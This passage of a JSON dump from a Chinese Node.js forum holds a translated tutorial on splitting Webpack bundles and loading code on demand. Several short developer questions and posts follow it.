包</li>\n</ul>\n<p>某些类型的人(比如我)会尝试让这个场景尽可能的真实。不要这样做。实际情况并不重要，稍后我们将找出原因。</p>\n<h3>基线</h3>\n<p>假设我们的 JavaScript 包的总容量是400 KB，目前我们将它作为一个名为 <code>main.js</code> 的文件加载。</p>\n<p>我们有一个 Webpack 配置如下(我省略了一些无关的配置):</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; webpack.config.js \n\nconst path = require(&#x27;path&#x27;)\n\nmodule.exports = {\n  entry: path.resolve(__dirame, &#x27;src&#x2F;index.js&#x27;)\n  output: {\n    path: path.resolve(__dirname, &#x27;dist&#x27;),\n    filename: &#x27;[name].[contenthash].js&#x27;\n  }\n}\n</code></pre><p>对于那些新的缓存破坏：任何时候我说 <code>main.js</code>，我实际上是指 <code>main.xMePWxHo.js</code>，其中里面的字符串是文件内容的散列。这意味着不同的文件名 当应用程序中的代码发生更改时，从而强制浏览器下载新文件。</p>\n<p>每周当我们对站点进行一些新的更改时，这个包的 <code>contenthash</code> 都会发生变化。因此，Alice 每周都要访问我们的站点并下载一个新的 <code>400kb</code> 文件。</p>\n<p>如果我们把这些事件做成一张表格，它会是这样的。</p>\n<p><img src=\"https://image.fundebug.com/2019-03-03-01.png\" alt></p>\n<p>也就是10周内， 4.12 MB, 我们可以做得更好。</p>\n<h3>分解 vendor 包</h3>\n<p>让我们将包分成 <code>main.js</code> 和 <code>vendor.js</code> 文件。</p>\n<pre class=\"prettyprint language-javascript\"><code> &#x2F;&#x2F; webpack.config.js \n\nconst path = require(&#x27;path&#x27;)\n\nmodule.exports = {\n  entry: path.resolve(__dirname, &#x27;src&#x2F;index.js&#x27;),\n  output: {\n    path: path.resolve(__dirname, &#x27;dist&#x27;),\n    filename: &#x27;[name].[contenthash].js&#x27;,\n  },\n  optimization: {\n    splitChunks: {\n      chunks: &#x27;all&#x27;\n    }\n  }\n}\n</code></pre><p>Webpack4 为你做最好的事情，而没有告诉你想要如何拆分包。这导致我们对 webpack 是如何分包的知之甚少，结果有人会问 “你到底在对我的包裹做什么？”</p>\n<p>添加 <code>optimization.splitChunks.chunks ='all'</code>的一种说法是 “将 <code>node_modules</code> 中的所有内容放入名为 <code>vendors~main.js</code> 的文件中”。</p>\n<p>有了这个基本的 bundle splitting，Alice 每次访问时仍然下载一个新的 200kb 的 <code>main.js</code>，但是在第一周、第8周和第5周只下载 200kb 的 <code>vendor.js</code> (不是按此顺序)。</p>\n<p><img src=\"https://image.fundebug.com/2019-03-03-02.png\" alt></p>\n<p>总共：<strong>2.64 MB</strong>。</p>\n<p>减少36％。 在我们的配置中添加五行代码并不错。 在进一步阅读之前，先去做。 如果你需要从 Webpack 3 升级到 4，请不要担心，它非常简单。</p>\n<p>我认为这种性能改进似乎更抽象，因为它是在10周内进行的，但是它确实为忠实用户减少了36%的字节，我们应该为自己感到自豪。</p>\n<p>但我们可以做得更好。</p>\n<h3>分离每个 npm 包</h3>\n<p>我们的 <code>vendor.js</code> 遇到了与我们的 <code>main.js</code> 文件相同的问题——对其中一部分的更改意味着重新下载它的所有部分。</p>\n<p>那么为什么不为每 个npm 包创建一个单独的文件呢?这很容易做到。</p>\n<p>所以把 <code>react</code>、<code>lodash</code>、<code>redux</code>、<code>moment</code> 等拆分成不同的文件:</p>\n<pre class=\"prettyprint language-javascript\"><code>const path = require(&#x27;path&#x27;);\nconst webpack = require(&#x27;webpack&#x27;);\n\nmodule.exports = {\n  entry: path.resolve(__dirname, &#x27;src&#x2F;index.js&#x27;),\n  plugins: [\n    new webpack.HashedModuleIdsPlugin(), &#x2F;&#x2F; so that file hashes don&#x27;t change unexpectedly\n  ],\n  output: {\n    path: path.resolve(__dirname, &#x27;dist&#x27;),\n    filename: &#x27;[name].[contenthash].js&#x27;,\n  },\n  optimization: {\n    runtimeChunk: &#x27;single&#x27;,\n    splitChunks: {\n      chunks: &#x27;all&#x27;,\n      maxInitialRequests: Infinity,\n      minSize: 0,\n      cacheGroups: {\n        vendor: {\n          test: &#x2F;[\\\\&#x2F;]node_modules[\\\\&#x2F;]&#x2F;,\n          name(module) {\n            &#x2F;&#x2F; get the name. E.g. node_modules&#x2F;packageName&#x2F;not&#x2F;this&#x2F;part.js\n            &#x2F;&#x2F; or node_modules&#x2F;packageName\n            const packageName = module.context.match(&#x2F;[\\\\&#x2F;]node_modules[\\\\&#x2F;](.*?)([\\\\&#x2F;]|$)&#x2F;)[1];\n\n            &#x2F;&#x2F; npm package names are URL-safe, but some servers don&#x27;t like @ symbols\n            return &#96;npm.${packageName.replace(&#x27;@&#x27;, &#x27;&#x27;)}&#96;;\n          },\n        },\n      },\n    },\n  },\n};\n</code></pre><p><a href=\"https://webpack.js.org/guides/caching/\">文档</a>将很好地解释这里的大部分内容，但是我将稍微解释一下需要注意的部分，因为它们花了我太多的时间。</p>\n<ul>\n<li>Webpack 有一些不太聪明的默认设置，比如分割输出文件时最多3个文件，最小文件大小为30 KB（所有较小的文件将连接在一起），所以我重写了这些。</li>\n<li><code>cacheGroups</code> 是我们定义 Webpack 应该如何将数据块分组到输出文件中的规则的地方。这里有一个名为 “vendor” 的模块，它将用于从 <code>node_modules</code> 加载的任何模块。通常，你只需将输出文件的名称定义为字符串。但是我将 <code>name</code>定义为一个函数(将为每个解析的文件调用这个函数)。然后从模块的路径返回包的名称。因此，我们将为每个包获得一个文件，例如 <code>npm.react-dom.899sadfhj4.js</code>。</li>\n<li><a href=\"https://docs.npmjs.com/files/package.json#name\">NPM 包名称必须是 URL 安全的才能发布</a>，因此我们不需要 <code>encodeURI</code> 的 <code>packageName</code>。 但是，我遇到一个.NET服务器不能提供名称中带有 <code>@</code>(来自一个限定范围的包)的文件，所以我在这个代码片段中替换了 <code>@</code>。</li>\n<li>整个设置很棒，因为它是一成不变的。 无需维护 - 不需要按名称引用任何包。</li>\n</ul>\n<p>Alice 仍然会每周重新下载 200 KB 的 <code>main.js</code> 文件，并且在第一次访问时仍会下载 200 KB 的npm包，但她绝不会两次下载相同的包。</p>\n<p><img src=\"https://image.fundebug.com/2019-03-03-03.png\" alt></p>\n<p>总共： <strong>2.24 MB.</strong></p>\n<p>与基线相比减少了44%，这对于一些可以从博客文章中复制/粘贴的代码来说非常酷。</p>\n<p>我想知道是否有可能超过 50% ? 这完全没有问题。</p>\n<p><strong>代码部署后可能存在的BUG没法实时知道，事后为了解决这些BUG，花了大量的时间进行log 调试，这边顺便给大家推荐一个好用的BUG监控工具<a href=\"https://www.fundebug.com/?utm_source=xiaozhi\">Fundebug</a>。</strong></p>\n<h3>分离应用程序代码的区域</h3>\n<p>让我们转到 main.js 文件，可怜的 Alice 一次又一次地下载这个文件。</p>\n<p>我之前提到过，我们在此站点上有两个不同的部分：产品列表和产品详细信息页面。 每个区域中的唯一代码为25 KB（共享代码为150 KB）。</p>\n<p>我们的产品详情页面现在变化不大，因为我们做得太完美了。 因此，如果我们将其做为单独的文件，则可以在大多数时间从缓存中获取到它。</p>\n<p>另外，我们网站有一个较大的内联SVG文件用于渲染图标，重量只有25 KB，而这个也是很少变化的， 我们也需要优化它。</p>\n<p>我们只需手动添加一些入口点，告诉 Webpack 为每个项创建一个文件。</p>\n<pre class=\"prettyprint language-javascript\"><code>module.exports = {\n  entry: {\n    main: path.resolve(__dirname, &#x27;src&#x2F;index.js&#x27;),\n    ProductList: path.resolve(__dirname, &#x27;src&#x2F;ProductList&#x2F;ProductList.js&#x27;),\n    ProductPage: path.resolve(__dirname, &#x27;src&#x2F;ProductPage&#x2F;ProductPage.js&#x27;),\n    Icon: path.resolve(__dirname, &#x27;src&#x2F;Icon&#x2F;Icon.js&#x27;),\n  },\n  output: {\n    path: path.resolve(__dirname, &#x27;dist&#x27;),\n    filename: &#x27;[name].[contenthash:8].js&#x27;,\n  },\n  plugins: [\n    new webpack.HashedModuleIdsPlugin(), &#x2F;&#x2F; so that file hashes don&#x27;t change unexpectedly\n  ],\n  optimization: {\n    runtimeChunk: &#x27;single&#x27;,\n    splitChunks: {\n      chunks: &#x27;all&#x27;,\n      maxInitialRequests: Infinity,\n      minSize: 0,\n      cacheGroups: {\n        vendor: {\n          test: &#x2F;[\\\\&#x2F;]node_modules[\\\\&#x2F;]&#x2F;,\n          name(module) {\n            &#x2F;&#x2F; get the name. E.g. node_modules&#x2F;packageName&#x2F;not&#x2F;this&#x2F;part.js\n            &#x2F;&#x2F; or node_modules&#x2F;packageName\n            const packageName = module.context.match(&#x2F;[\\\\&#x2F;]node_modules[\\\\&#x2F;](.*?)([\\\\&#x2F;]|$)&#x2F;)[1];\n\n            &#x2F;&#x2F; npm package names are URL-safe, but some servers don&#x27;t like @ symbols\n            return &#96;npm.${packageName.replace(&#x27;@&#x27;, &#x27;&#x27;)}&#96;;\n          },\n        },\n      },\n    },\n  },\n};\n</code></pre><p>Webpack 还会为 <code>ProductList</code> 和 <code>ProductPage</code> 之间共享的内容创建文件，这样我们就不会得到重复的代码。</p>\n<p>这将为 Alice 在大多数情况下节省 50 KB 的下载。</p>\n<p><img src=\"https://image.fundebug.com/2019-03-03-04.png\" alt></p>\n<p>只有 <strong>1.815 MB!</strong></p>\n<p>我们已经为 Alice 节省了高达56％的下载量，这种节省将（在我们的理论场景中）持续到时间结束。</p>\n<p>所有这些都只在Webpack配置中进行了更改——我们没有对应用程序代码进行任何更改。</p>\n<p>我在前面提到过，测试中的确切场景并不重要。这是因为，无论你提出什么场景，结论都是一样的:将应用程序分割成合理的小文件，以便用户下载更少的代码。</p>\n<p>很快，=将讨论“code splitting”——另一种类型的文件分割——但首先我想解决你现在正在考虑的三个问题。</p>\n<p><strong>#1：大量的网络请求不是更慢吗?</strong></p>\n<p>答案当然是<strong>不会</strong>。</p>\n<p>在 HTTP/1.1 时代，这曾经是一种情况，但在 HTTP/2 时代就不是这样了。</p>\n<p>尽管如此，<a href=\"https://medium.com/%5B@asyncmax%5D(/user/asyncmax)/the-right-way-to-bundle-your-assets-for-faster-sites-over-http-2-437c37efe3ff\">这篇2016年的文章</a> 和 <a href=\"http://engineering.khanacademy.org/posts/js-packaging-http2.htm\">Khan Academy 2015年的文章</a>都得出结论，即使使用 HTTP/2，下载太多的文件还是比较慢。但在这两篇文章中，“太多”的意思都是“几百个”。所以请记住，如果你有数百个文件，你可能一开始就会遇到并发限制。</p>\n<p>如果您想知道，对 HTTP/2 的支持可以追溯到 Windows 10 上的 ie11。我做了一个详尽的调查，每个人都使用比那更旧的设置，他们一致向我保证，他们不在乎网站加载有多快。</p>\n<p><strong>#2:每个webpack包中没有 开销/引用 代码吗?</strong></p>\n<p>是的，这也是真的。</p>\n<p>好吧,狗屎:</p>\n<ul>\n<li>more files = 更多 Webpack 引用</li>\n<li>more files = 不压缩</li>\n</ul>\n<p>让我们量化一下，这样我们就能确切地知道需要担心多少。</p>\n<p>好的，我刚做了一个测试，一个 190 KB 的站点拆分成 19 个文件，增加了大约 2％发送到浏览器的总字节数。</p>\n<p>因此…在第一次访问时增加 2％，在每次访问之前减少60％直到网站下架。</p>\n<p>正确的担忧是:完全没有。</p>\n<p>当我测试1个文件对19个时，我想我会在一些不同的网络上试一试，包括HTTP / 1.1</p>\n<p><img src=\"https://image.fundebug.com/2019-03-03-05.png\" alt></p>\n<p>在 3G 和4G上，这个站点在有19个文件的情况下加载时间减少了30%。</p>\n<p>这是非常杂乱的数据。 例如，在运行2号 的 4G 上，站点加载时间为 646ms，然后运行两次之后，加载时间为1116ms，比之前长73%，没有变化。因此，声称 HTTP/2 “快30%” 似乎有点鬼鬼祟祟。</p>\n<p>我创建这个表是为了尝试量化 HTTP/2 所带来的差异，但实际上我唯一能说的是“它可能没有显著的差异”。</p>\n<p>真正令人吃惊的是最后两行。那是旧的 Windows 和 HTTP/1.1，我打赌会慢得多,我想我需把网速调慢一点。</p>\n<p>我从微软的网站上下载了一个Windows 7 虚拟机来测试这些东西。它是 IE8 自带的，我想把它升级到IE9，所以我转到微软的IE9下载页面…</p>\n<p><img src=\"https://image.fundebug.com/2019-03-03-06.png\" alt=\"06\">关于HTTP/2 的最后一个问题，你知道它现在已经内置到 Node中了吗?如果你想体验一下，我编写了<a href=\"https://gist.github.com/davidgilbertson/e5690c04e06c4882cf5761f8acff36ec\">一个带有gzip、brotli和响应缓存的小型100行HTTP/2服务器</a>点击预览，以满足你的测试乐趣。</p>\n<p>这就是我要讲的关于 bundle splitting 的所有内容。我认为这种方法唯一的缺点是必须不断地说服人们加载大量的小文件是可以的。</p>\n<h3>Code splitting (加载你需要的代码)</h3>\n<p>我说，这种特殊的方法只有在某些网站上才有意义。</p>\n<p>我喜欢应用我刚刚编造的 20/20 规则:如果你的站点的某个部分只有 20% 的用户访问，并且它大于站点的 JavaScript 的 20%，那么你应该按需加载该代码。</p>\n<h4>如何决定?</h4>\n<p>假设你有一个购物网站，想知道是否应该将“checkout”的代码分开，因为只有30%的访问者才会访问那里。</p>\n<p>首先要做的是卖更好的东西。</p>\n<p>第二件事是弄清楚多少代码对于结账功能是完全独立的。 由于在执行“code splitting” 之前应始终先“bundle splitting’ ”，因此你可能已经知道代码的这一部分有多大。</p>\n<p>它可能比你想象的要小，所以在你太兴奋之前做一下加法。例如，如果你有一个 React 站点，那么你的 <code>store</code>、<code>reducer</code>、<code>routing</code>、<code>actions</code> 等都将在整个站点上共享。唯一的部分将主要是组件和它们的帮助类。</p>\n<p>因此，你注意到你的结帐页面完全独特的代码是 <code>7KB</code>。 该网站的其余部分是 <code>300 KB</code>。 我会看着这个，然后说，我不打算把它拆分，原因如下:</p>\n<ul>\n<li>\n<p>提前加载不会变慢。记住，你是在并行加载所有这些文件。查看是否可以记录 <code>300KB</code> 和 <code>307KB</code> 之间的加载时间差异。</p>\n</li>\n<li>\n<p>如果你稍后加载此代码，则用户必须在单击“TAKE MY MONEY”之后等待该文件 - 你希望延迟的最小的时间。</p>\n</li>\n<li>\n<p>Code splitting 需要更改应用程序代码。 它引入了异步逻辑，以前只有同步逻辑。 这不是火箭科学，但我认为应该通过可感知的用户体验改进来证明其复杂性。</p>\n</li>\n</ul>\n<p>让我们看两个 code splitting 的例子。</p>\n<h3>Polyfills</h3>\n<p>我将从这个开始，因为它适用于大多数站点，并且是一个很好的简单介绍。</p>\n<p>我在我的网站上使用了一些奇特的功能，所以我有一个文件可以导入我需要的所有polyfill， 它包括以下八行：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; polyfills.js \nrequire(&#x27;whatwg-fetch&#x27;);\nrequire(&#x27;intl&#x27;);\nrequire(&#x27;url-polyfill&#x27;);\nrequire(&#x27;core-js&#x2F;web&#x2F;dom-collections&#x27;);\nrequire(&#x27;core-js&#x2F;es6&#x2F;map&#x27;);\nrequire(&#x27;core-js&#x2F;es6&#x2F;string&#x27;);\nrequire(&#x27;core-js&#x2F;es6&#x2F;array&#x27;);\nrequire(&#x27;core-js&#x2F;es6&#x2F;object&#x27;);\n</code></pre><p>在 <code>index.js</code> 中导入这个文件。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; index-always-poly.js\nimport &#x27;.&#x2F;polyfills&#x27;;\nimport React from &#x27;react&#x27;;\nimport ReactDOM from &#x27;react-dom&#x27;;\nimport App from &#x27;.&#x2F;App&#x2F;App&#x27;;\nimport &#x27;.&#x2F;index.css&#x27;;\n\nconst render = () =&gt; {\n  ReactDOM.render(&lt;App &#x2F;&gt;, document.getElementById(&#x27;root&#x27;));\n}\n\nrender(); &#x2F;&#x2F; yes I am pointless, for now\n</code></pre><p>使用 bundle splitting 的 Webpack 配置，我的 polyfills 将自动拆分为四个不同的文件，因为这里有四个 npm 包。 它们总共大约 25 KB，并且 90％ 的浏览器不需要它们，因此值得动态加载它们。</p>\n<p>使用 Webpack 4 和 <code>import()</code> 语法（不要与 <code>import</code> 语法混淆），有条件地加载polyfill 非常容易。</p>\n<pre class=\"prettyprint language-javascript\"><code>import React from &#x27;react&#x27;;\nimport ReactDOM from &#x27;react-dom&#x27;;\nimport App from &#x27;.&#x2F;App&#x2F;App&#x27;;\nimport &#x27;.&#x2F;index.css&#x27;;\n\nconst render = () =&gt; {\n  ReactDOM.render(&lt;App &#x2F;&gt;, document.getElementById(&#x27;root&#x27;));\n}\n\nif (\n  &#x27;fetch&#x27; in window &amp;&amp;\n  &#x27;Intl&#x27; in window &amp;&amp;\n  &#x27;URL&#x27; in window &amp;&amp;\n  &#x27;Map&#x27; in window &amp;&amp;\n  &#x27;forEach&#x27; in NodeList.prototype &amp;&amp;\n  &#x27;startsWith&#x27; in String.prototype &amp;&amp;\n  &#x27;endsWith&#x27; in String.prototype &amp;&amp;\n  &#x27;includes&#x27; in String.prototype &amp;&amp;\n  &#x27;includes&#x27; in Array.prototype &amp;&amp;\n  &#x27;assign&#x27; in Object &amp;&amp;\n  &#x27;entries&#x27; in Object &amp;&amp;\n  &#x27;keys&#x27; in Object\n) {\n  render();\n} else {\n  import(&#x27;.&#x2F;polyfills&#x27;).then(render);\n}\n</code></pre><p>合理？ 如果支持所有这些内容，则渲染页面。 否则，导入 polyfill 然后渲染页面。 当这个代码在浏览器中运行时，Webpack 的运行时将处理这四个 npm 包的加载，当它们被下载和解析时，将调用 <code>render()</code> 并继续进行。</p>\n<p>顺便说一句，要使用 <code>import()</code>，你需要 <a href=\"https://babeljs.io/docs/en/babel-plugin-syntax-dynamic-import/\">Babel 的动态导入插件</a>。另外，正如 Webpack 文档解释的那样，<a href=\"https://webpack.js.org/guides/code-splitting/#dynamic-imports\">import() 使用 promises</a>，所以你需要将其与其他polyfill分开填充。</p>\n<h3>基于路由的动态加载（特定于React）</h3>\n<p>回到 Alice 的例子，假设站点现在有一个“管理”部分，产品的销售者可以登录并管理他们所销售的一些没用的记录。</p>\n<p>本节有许多精彩的特性、大量的图表和来自 npm 的大型图表库。因为我已经在做 bundle splittin 了，我可以看到这些都是超过 100 KB 的阴影。</p>\n<p>目前，我有一个路由设置，当用户查看 <code>/admin</code> URL时，它将渲染 <code>&lt;AdminPage&gt;</code>。当Webpack 打包所有东西时，它会找到 <code>import AdminPage from './AdminPage.js'</code>。然后说&quot;嘿，我需要在初始负载中包含这个&quot;</p>\n<p>但我们不希望这样，我们需要将这个引用放到一个动态导入的管理页面中，比如<code>import('./AdminPage.js')</code> ，这样 Webpack 就知道动态加载它。</p>\n<p>它非常酷，不需要配置。</p>\n<p>因此，不必直接引用 <code>AdminPage</code>，我可以创建另一个组件，当用户访问 <code>/admin</code> URL时将渲染该组件，它可能是这样的:</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; AdminPageLoader.js \nimport React from &#x27;react&#x27;;\n\nclass AdminPageLoader extends React.PureComponent {\n  constructor(props) {\n    super(props);\n\n    this.state = {\n      AdminPage: null,\n    }\n  }\n\n  componentDidMount() {\n    import(&#x27;.&#x2F;AdminPage&#x27;).then(module =&gt; {\n      this.setState({ AdminPage: module.default });\n    });\n  }\n\n  render() {\n    const { AdminPage } = this.state;\n\n    return AdminPage\n      ? &lt;AdminPage {...this.props} &#x2F;&gt;\n      : &lt;div&gt;Loading...&lt;&#x2F;div&gt;;\n  }\n}\n\nexport default AdminPageLoader;\n</code></pre><p>这个概念很简单，对吧? 当这个组件挂载时(意味着用户位于 <code>/admin</code> URL)，我们将动态加载 <code>./AdminPage.js</code>，然后在状态中保存对该组件的引用。</p>\n<p>在 <code>render</code> 方法中，我们只是在等待 <code>&lt;AdminPage&gt;</code> 加载时渲染 <code>&lt;div&gt;Loading...&lt;/div&gt;</code>，或者在加载并存储状态时渲染 <code>&lt;AdminPage&gt;</code>。</p>\n<p>我想自己做这个只是为了好玩，但是在现实世界中，你只需要使用 <code>react-loadable</code> ，如关于 <a href=\"https://reactjs.org/docs/code-splitting.html\">code-splitting 的React文档</a>中所述。</p>\n<h3>总结</h3>\n<p>对于上面总结以下两点：</p>\n<ul>\n<li>如果有人不止一次访问你的网站，把你的代码分成许多小文件。</li>\n<li>如果你的站点有大部分用户不访问的部分，则动态加载该代码。</li>\n</ul>\n<p><strong>原文：</strong> <a href=\"https://hackernoon.com/the-100-correct-way-to-split-your-chunks-with-webpack-f8a9df5b7758\">The 100% correct way to split your chunks with Webpack</a></p>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了10亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n</div>","title":"Web 性能优化： 使用 Webpack 分离数据的正确方法","last_reply_at":"2019-03-04T07:33:57.097Z","good":true,"top":false,"reply_count":1,"visit_count":875,"create_at":"2019-03-04T02:18:36.451Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c7cc3275b8cb21491ca59b9","author_id":"5c1c411f76c4964062a1c0e3","tab":"share","content":"<div class=\"markdown-text\"><p>继 PC 版 <a href=\"https://www.frontendjs.com/\">前站导航</a> 网站，对应的微信小程序版也发布了，微信搜索 <strong>i前站导航</strong> 即可浏览。</p>\n<p>目前可以在手机端浏览各个社区、文档网址，动态趣图，代码秀等模块，后续还有更多功能开放。</p>\n<p>希望大家多多提出宝贵意见 ^.^\n<img src=\"http://images.frontendjs.com/ad-mini-app.jpg\" alt=\"小程序\"></p>\n</div>","title":"前站小程序发布","last_reply_at":"2019-03-04T06:18:15.222Z","good":false,"top":false,"reply_count":0,"visit_count":586,"create_at":"2019-03-04T06:18:15.222Z","author":{"loginname":"bestvist","avatar_url":"https://avatars2.githubusercontent.com/u/22828569?v=4&s=120"}},{"id":"5c79e1385b8cb21491ca5175","author_id":"5bf3cec8e6481c5709f5d871","tab":"ask","content":"<div class=\"markdown-text\"><p>打包路径设置\n<img src=\"//static.cnodejs.org/Fr3Ot0LCxezCeARtqBQUnS5RC0gp\" alt=\"image.png\">\n页面显示\n<img src=\"//static.cnodejs.org/FqFgXdBsLCo0oGw4lOZF1kank3AD\" alt=\"image.png\">\n资源加载信息\n<img src=\"//static.cnodejs.org/FovbG2sQdLL2_S9BcVNVpUXWrN9c\" alt=\"image.png\">\n报错信息\n<img src=\"//static.cnodejs.org/FqjY2DUPGB-GV7Fn4NJSBr-gxMJ7\" alt=\"image.png\"></p>\n<p>求帮忙！</p>\n</div>","title":"vue打包路径问题，根目录在打包dist上一级","last_reply_at":"2019-03-04T02:52:43.634Z","good":false,"top":false,"reply_count":1,"visit_count":672,"create_at":"2019-03-02T01:49:44.673Z","author":{"loginname":"tzbcf","avatar_url":"https://avatars1.githubusercontent.com/u/25059314?v=4&s=120"}},{"id":"5c7c92595b8cb21491ca5732","author_id":"566192ec28d9d1ba58c3a319","tab":"ask","content":"<div class=\"markdown-text\"><p>请教下大家个问题：在客户端访问量稍大的时候，在发送上传图片的base64请求时，偶尔会发生服务端有给响应，但是客户端收不到网络超时的情况，客户端超时已经设置30s了，请问在客户端h5页面和服务端中可以怎样进一步优化这个问题呢？\nnginx的允许请求体大小已经设置成10M了。\nh5页面是vue单页面+axios发送请求\n还可以在哪方面做些改善呢？请高手们指点迷津下哈！</p>\n</div>","title":"h5页面客户端网络异常，但服务端有正常响应","last_reply_at":"2019-03-04T02:50:01.398Z","good":false,"top":false,"reply_count":0,"visit_count":378,"create_at":"2019-03-04T02:50:01.398Z","author":{"loginname":"jiangliqin","avatar_url":"https://avatars1.githubusercontent.com/u/12250847?v=4&s=120"}},{"id":"5c53a1a605cc322e7b136c9e","author_id":"57fef4a9fdf3bd3d6511858f","tab":"ask","content":"<div class=\"markdown-text\"><p>mysql小白请教个问题\n如何使用egg-sequelize做如下查找</p>\n<p>数据有一条字段是数组(字符串逗号分隔)</p>\n<p>查找条件是一个数组，比如’a,b,c’</p>\n<p>如何查找数据里带查找条件的数据，只要求是或的逻辑，a,b,c包含一个即可</p>\n</div>","title":"使用sequelize如何做数组包含查找","last_reply_at":"2019-03-03T17:24:42.366Z","good":false,"top":false,"reply_count":7,"visit_count":1132,"create_at":"2019-02-01T01:32:22.903Z","author":{"loginname":"IEfucker","avatar_url":"https://avatars0.githubusercontent.com/u/3446876?v=4&s=120"}},{"id":"5c793b525b8cb21491ca50ce","author_id":"58bcce197872ea0864fee3d5","tab":"ask","content":"<div class=\"markdown-text\"><p>想看东宫，但是没开会员，不知道怎么免费看，打开控制台审查元素时，video标签的src属性值是blob:<a href=\"https://v.youku.com/7981f421-64e0-48fa-87b6-e3a161c116fd%E3%80%82%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%E5%91%80%EF%BC%9F\">https://v.youku.com/7981f421-64e0-48fa-87b6-e3a161c116fd。这是什么意思呀？</a></p>\n</div>","title":"有人知道怎么破解vip视频免费看吗？","last_reply_at":"2019-03-03T12:26:26.727Z","good":false,"top":false,"reply_count":5,"visit_count":859,"create_at":"2019-03-01T14:01:54.723Z","author":{"loginname":"dreamsline","avatar_url":"https://avatars3.githubusercontent.com/u/20219371?v=4&s=120"}},{"id":"5c7bac1d90c14711cc8c9bda","author_id":"56efaf9802c237a73a1a89a2","tab":"ask","content":"<div class=\"markdown-text\"><p>我再npm下载nproxy作为代理服务器，设置了网页代理服务器后，其他的网站都能代理访问都能经过代理，只有localhost和127.0.0.1不经过代理，把localhost更改为局域网ip访问后又经过代理了，什么原因？代理监控的是网卡吗？localhost不经过网卡所以监控不带无法做代理吗？那么如果对localhost做代理呢？</p>\n</div>","title":"网页代理服务器，为什么不能代理localhost呢","last_reply_at":"2019-03-03T10:27:41.518Z","good":false,"top":false,"reply_count":0,"visit_count":625,"create_at":"2019-03-03T10:27:41.518Z","author":{"loginname":"lyt308012546","avatar_url":"https://avatars1.githubusercontent.com/u/10969445?v=4&s=120"}},{"id":"5c6cc666e1a81129a7ad88b6","author_id":"5c024ab7887c5864fafe1804","tab":"ask","content":"<div class=\"markdown-text\"><p>背景:因为vue-cli更新3.x了，所以想把2.x版本删除\n是用yarn global add vue-cli@2.x 的\n在我卸载掉2.x版本后，yarn的全局bin目录下多出了好多.cmd文件\n原本只有使用yarn global add xxx 安装的包的名字.cmd文件\n对于强迫症来说有点难受\n另外是不是有可能会覆盖命令，\n举一个例子，我电脑有java环境，正常情况下在powershell输入java是java环境的一些输出，如果yarn的bin目录下也有一个叫java的，是不是会冲突</p>\n</div>","title":"yarn global remove 的 问题","last_reply_at":"2019-03-02T12:29:15.281Z","good":false,"top":false,"reply_count":2,"visit_count":652,"create_at":"2019-02-20T03:15:50.189Z","author":{"loginname":"1124219777","avatar_url":"https://avatars2.githubusercontent.com/u/17058939?v=4&s=120"}},{"id":"5c77a36b04a28b40c4f6a9d2","author_id":"5c77a18ea667ed6d807ba229","tab":"share","content":"<div class=\"markdown-text\"><h1>Node.js的两种运行模式</h1>\n<h2>REPL模式</h2>\n<p>在Node.js中为了开发者方便测试代码，提供了REPL（Read-Eval\n-Print-Loop）交互模式。开发者输入表达式，按下enter键就能立即执行。在交互模式下，使用Node.js各个内置模块不需要require。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/1693331e8a89675d?w=289&amp;h=97&amp;f=png&amp;s=5527\" alt></p>\n<p>说明：为什么命令行（chrome浏览器控制台也一样）会输出一个undefined？交互模式中，程序会自动的返回上一段语句的返回值。</p>\n<p><code>var user={name:”tom”,age:18}</code></p>\n<p>这段语句本身没有返回值，user.name的返回值是tom。</p>\n<p><strong>疑问：假如我们使用Node.js进行开发，REPL根本无法满足开发条件，不具备项目管理功能，代码段零散无法管理和难修改。</strong></p>\n<h2>脚本模式</h2>\n<p>在实际项目开发中，我们使用的是脚本模式。就是讲JS代码段写在一个.js文件中，然后统一执行。</p>\n<p>创建一个.js文件，使用任意一款文本编辑软件打开，并可以直接编码。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/1693333b1f6b1204?w=82&amp;h=100&amp;f=png&amp;s=5207\" alt></p>\n<pre class=\"prettyprint\"><code>var user={\n      name:&quot;tom&quot;,\n      age:23,\n      job:&quot;WEB前端&quot;,\n      wages:10000,\n      wageTime:12\n   }\nvar totalWages=user.wages*user.wageTime;\nconsole.log(&#96;我叫${user.name},\n             今年${user.age}岁,\n             目前从事${user.job}工作，\n             我月薪是${user.wages}，\n             已经工作${user.wageTime}个月了,\n             现在累计收入已经达到${totalWages}元！&#96;);\n</code></pre><p>在命令行工具中，运用node指令+文件路径+文件名的形式回车执行。</p>\n<p>比如：node c:\\Users\\Administator\\Dsektop\\app.js</p>\n<p>小技巧：如果嫌手动输入路径太麻烦，在命令行输入node关键字和空格，然后和直接拖拽文件到命令行中，最后效果一样。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/1693339bae16d5bf?w=556&amp;h=148&amp;f=png&amp;s=22205\" alt></p>\n<h1>IDE工具的选择</h1>\n<p>WebStorm 被广大中国JS开发者誉为“Web前端开发神器”、“最强大的HTML5编辑器”、“最智能的JavaScript IDE”等。它支持代码检查与快速修复，代码调试，代码格式化，代码补全，他对Node.js的支持非常友好。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169333ae5b93e1e3?w=554&amp;h=346&amp;f=png&amp;s=30683\" alt></p>\n<h2>在WebStrom中运行Node程序</h2>\n<p>写好Node.js程序后，如果我们需要调试程序可以直接鼠标右键点击，选择run 文件名.js进行运行。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169333b3047d5c82?w=425&amp;h=451&amp;f=png&amp;s=81225\" alt></p>\n<p>运行结果可以直接在Webstrom控制台打印出来。</p>\n<p><img 